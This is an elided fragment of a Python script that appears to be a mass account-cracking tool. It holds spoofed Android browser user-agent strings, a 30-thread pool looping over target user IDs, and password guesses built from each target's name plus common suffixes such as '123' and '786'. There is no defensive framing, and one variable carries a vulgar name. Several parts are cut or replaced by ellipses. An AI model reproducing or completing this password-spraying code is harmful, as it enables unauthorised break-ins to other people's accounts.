...
def ua_krek():
        ...
        ua = (f"Mozilla/5.0 (Linux; Android 8.1.0; vivo 1723 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.126 Mobile Safari/537.36")
        return ua
...
def ua_crack():
		...
		ngentod = f"Mozilla/5.0 (Linux; Android 9; LG V30) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Mobile Safari/537.36"
	...
	with prog:
		with tred(max_workers=30) as pool:
			for yuzong in id2:
				...
				if '4' in pwlist:
					pwv=[nmf,frs+'123',frs+'1234',frs+'12345',frs+'1',frs+'12',frs+'786']
				if '5' in pwlist:
